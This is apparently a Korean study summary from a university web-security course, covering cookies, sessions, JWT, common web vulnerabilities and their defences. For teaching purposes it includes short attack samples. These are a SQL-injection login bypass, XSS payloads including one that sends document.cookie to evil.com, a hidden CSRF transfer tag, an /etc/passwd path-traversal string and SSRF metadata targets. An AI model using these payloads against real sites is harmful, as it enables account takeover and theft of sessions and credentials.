**과정**: 스마트보안 전공 웹 프로그래밍
**범위**: Chapter 10. Web security

## Part 1. 상태 유지 메커니즘 (Cookie, Session, JWT)
HTTP 프로토콜은 기본적으로 **무상태성(Stateless)**을 가집니다. 즉, 요청 간에 클라이언트의 상태나 과거 기록을 기억하지 못하기 때문에 로그인을 하더라도 다음 요청(`GET /dashboard`) 시 인증 정보가 소실되어 `401 Unauthorized` 에러가 발생합니다. 이를 해결하기 위한 메커니즘이 필요합니다.

* **Cookie (쿠키)**
    * 브라우저에 저장되는 작은 텍스트 데이터입니다. 서버가 `Set-Cookie` 헤더를 통해 쿠키를 설정하면, 브라우저는 이후 해당 서버로 보내는 모든 요청에 자동으로 쿠키를 첨부합니다.
    * **보안 및 스코프 속성**: 
        * `HttpOnly`: 자바스크립트(`document.cookie`)로 쿠키에 접근하는 것을 차단하여 XSS 공격을 방어합니다.
        * `Secure`: HTTPS 연결에서만 쿠키를 전송하도록 하여 중간자 공격(MITM)을 방어합니다.
        * `Domain / Path`: 쿠키가 전송될 유효 범위를 제한합니다.
        * `Expires / Max-Age`: 쿠키의 수명을 결정하며, 설정하지 않으면 브라우저 종료 시 삭제되는 세션 쿠키가 됩니다.
* **Session (세션)**
    * 인증 후 **서버 측에서 상태를 관리**하는 방식입니다. 로그인이 성공하면 서버는 DB나 Redis에 세션 레코드를 만들고, 무작위 문자열인 '세션 ID'를 클라이언트에게 쿠키로 발급합니다. 클라이언트가 이 세션 ID를 보내면 서버가 스토어에서 데이터를 조회(Lookup)합니다.
* **Session vs JWT 비교**
    * **세션**은 상태가 서버(DB/Redis)에 저장되며 자격 증명은 무의미한 난수 ID입니다. 서버에서 레코드를 지우면 즉시 무효화(Revocation)가 가능하지만, 분산 환경에서는 저장소 공유가 필요해 확장성이 떨어집니다.
    * **JWT**는 상태가 클라이언트(서명된 토큰)에 저장되며, 사용자 정보(sub, role 등)를 포함합니다. 서버 저장소가 필요 없어 확장성이 뛰어나지만, 토큰 만료 전까지 강제 무효화가 어렵습니다.

> *(이상 교안 1~7페이지 내용 통합 요약)*

## Part 2. 웹 취약점의 이해와 공격 원리

### 1. SQL Injection (SQLi)
검증되지 않은 사용자 입력값이 SQL 쿼리 문자열에 직접 삽입되어, 원래 의도된 쿼리 로직을 변조하는 공격입니다. 로그인 폼, URL 파라미터 등 DB와 연결된 모든 곳이 타겟이 됩니다.
* **데이터 추출 방식에 따른 분류**: 
    * `In-band (Classic)`: 쿼리 결과나 에러 메시지가 화면에 직접 노출되는 방식 (Error-based, Union-based 등).
    * `Blind`: 화면에 결과가 출력되지 않을 때 사용합니다. 참/거짓에 따른 미세한 반응 차이를 이용하는 `Boolean-based`, `SLEEP()` 함수를 통해 지연 시간으로 데이터를 유추하는 `Time-based`가 있습니다.
* **주석 삽입을 통한 로그인 우회 예시 (원리)**:
    * 백엔드 코드: `WHERE email = '${email}' AND password = '${password}'`
    * 공격자 입력 (이메일 필드): `tmp' AND '1' = '1' --`
    * 조작된 쿼리: `WHERE email = 'tmp' AND '1' = '1' -- AND password = 'test'`
    * 결과: `--` 이후의 비밀번호 검증 구문이 주석 처리되어 무시되므로, 비밀번호를 몰라도 로그인이 우회됩니다.

### 2. Cross-Site Scripting (XSS)
신뢰할 수 있는 웹 페이지에 악성 자바스크립트를 주입하여, 피해자의 브라우저에서 실행되게 하는 공격입니다. 실행된 스크립트는 해당 사이트와 동일한 권한을 가지므로 세션 쿠키 탈취(`<script>fetch('evil.com?c='+document.cookie)</script>`) 등에 사용됩니다.
* **Stored XSS**: 악성 스크립트(예: `<img src=x onerror="alert('stored xss')">`)가 게시판 등에 등록되어 DB에 저장되고, 페이지를 방문하는 모든 사용자에게 실행됩니다.
* **Reflected XSS**: URL 파라미터(`?q=<script>...`)에 삽입된 스크립트가 서버의 응답 HTML에 그대로 반사되어 실행됩니다. 피해자가 조작된 링크를 클릭해야 발동합니다.
* **DOM-based XSS**: 서버 응답은 안전하지만, 브라우저 단의 JS 로직 자체가 취약할 때 발생합니다. `location.hash` 같은 입력 소스에서 값을 읽어 안전한 처리 없이 `innerHTML` 같은 실행 지점(Sink)에 직접 쓸 때 발생합니다. (예: `URL#<img src=x onerror=...>`)

### 3. CSRF (Cross-Site Request Forgery)
인증된 사용자의 브라우저가 가진 **'쿠키 자동 첨부 기능'**을 악용하는 공격입니다. 
* 공격자는 `<img src="/transfer?amount=5000">`와 같이 은행 송금을 유도하는 태그를 숨겨둔 악성 페이지를 만듭니다. 로그인된 피해자가 이 페이지에 접속하면, 브라우저는 은행 서버로 요청을 보낼 때 피해자의 세션 쿠키를 자동으로 포함시킵니다.
* **XSS와의 차이**: XSS는 사용자가 '웹사이트'를 신뢰하는 점을 노리고 스크립트를 주입하지만, CSRF는 '웹사이트'가 인증된 사용자의 '브라우저 요청'을 맹신하는 점을 노리며 스크립트 실행이 필수가 아닙니다.

### 4. Path Traversal & 파일 업로드
사용자 입력으로 파일 경로를 구성할 때 `../` 시퀀스를 통해 의도된 디렉토리를 벗어나 시스템 파일에 접근하는 공격입니다. (예: `/app/uploads/../../../etc/passwd`로 패스워드나 `.env` 탈취)
* **파일 업로드 벡터**: 파일명에 `../../config/app.js`를 넣어 시스템의 핵심 설정 파일이나 서버 코드를 덮어씌울 수 있습니다. 웹 접근 경로에 `shell.php` 등을 올리면 원격 코드 실행(RCE)으로 이어집니다.
* **방어**: 업로드된 원본 파일명을 절대 경로 구성에 직접 사용하지 말고 UUID를 생성하여 저장하거나, `path.basename(name)`을 사용해 디렉토리 구분자를 모두 안전하게 제거해야 합니다.

### 5. SSRF (Server-Side Request Forgery)
서버가 사용자가 입력한 URL을 대신 요청해 주는 기능을 악용하여, 공격자가 외부망에서 접근 불가능한 **내부 네트워크 자원**을 서버가 직접 호출하도록 만드는 공격입니다.
* 방화벽 내부에 위치한 서버가 직접 요청을 보내기 때문에, 클라우드 메타데이터(`169.254.169.254`), 로컬 데이터베이스(`localhost:3306`), 내부 어드민 패널 등에 접근하여 중요 정보를 탈취할 수 있습니다.

> *(이상 교안 8~26페이지 내용 통합 요약)*

## Part 3. 방어 및 보안 정책 (Web Security Mechanisms)

### 1. 입력값 검증과 DOMPurify
* **DOMPurify**: XSS를 방어하기 위한 클라이언트 사이드 HTML 새니타이제이션(Sanitization, 정화) 라이브러리입니다.
* 안전하지 않은 `<script>`나 `onerror` 같은 이벤트 핸들러는 제거하고, `<b>`, `<p>` 같은 안전한 태그만 남깁니다. 입력 시점이 아닌 **렌더링 시점**에 필터링을 수행하는 것이 중요합니다.

### 2. SOP와 CORS
* **Same-Origin Policy (SOP)**: 브라우저 보안의 근간으로, 프로토콜, 호스트명, 포트번호가 일치하는 '동일 출처'에서만 스크립트가 DOM이나 쿠키 등에 접근할 수 있도록 차단합니다.
* **Cross-Origin Resource Sharing (CORS)**: SOP를 안전하게 완화하여 교차 출처 리소스 공유를 허용하는 메커니즘입니다. 서버가 `Access-Control-Allow-Origin` 등의 HTTP 헤더를 통해 권한을 부여합니다.
* **Preflight (사전 요청)**: GET, 일반 POST 등 '단순 요청(Simple Request)'은 바로 전송되지만, PUT, DELETE 또는 커스텀 헤더(`Authorization` 등)가 포함된 요청은 브라우저가 본 요청 전에 `OPTIONS` 메서드로 **Preflight** 요청을 먼저 보내 서버가 허용하는지 검사합니다.

### 3. Content Security Policy (CSP)
브라우저가 로드할 수 있는 리소스(스크립트, 스타일, 이미지 등)의 출처를 화이트리스트 방식으로 제한하는 HTTP 헤더입니다 (`script-src`, `img-src` 등). 인라인 스크립트 실행을 원천 차단할 수 있어, 새니타이제이션을 뚫고 들어온 XSS 공격도 방어해 내는 훌륭한 2차 방어선 역할을 합니다.

### 4. CSRF 방어 기제
* **CSRF Token**: 세션별로 무작위 비밀 난수를 생성하여 HTML 폼의 숨겨진 필드(`<input type="hidden">`)에 담아 보냅니다. 다른 출처의 공격자는 SOP 때문에 이 토큰 값을 읽어올 수 없으므로, 토큰이 누락되거나 불일치하는 위조 요청을 서버가 거절합니다.
* **SameSite Cookie 속성**: 브라우저가 타 사이트 도메인으로 요청을 보낼 때 쿠키를 첨부할지 결정합니다.
    * `Strict`: 교차 사이트 요청에는 절대 쿠키를 보내지 않습니다.
    * `Lax`: 최상위 GET 네비게이션(링크 클릭 등)에서만 쿠키를 보냅니다. (현대 브라우저의 기본값이며 대부분의 CSRF를 방어함)
    * `None`: 항상 쿠키를 보냅니다. 단, 이 설정을 쓰려면 반드시 `Secure` 속성이 함께 적용되어야 합니다.

### 5. 쿠키의 핵심 방어 속성 요약
* **HttpOnly**: 자바스크립트를 통한 쿠키 탈취(XSS)를 원천 차단합니다. 세션과 인증 쿠키에는 필수입니다.
* **Secure**: 네트워크 스니핑 공격으로부터 쿠키를 보호하기 위해 HTTPS 연결에서만 쿠키를 전송합니다. 완전한 보호를 위해 HttpOnly, SameSite와 함께 사용해야 합니다.

> *(이상 교안 27~47페이지 내용 통합 요약)*
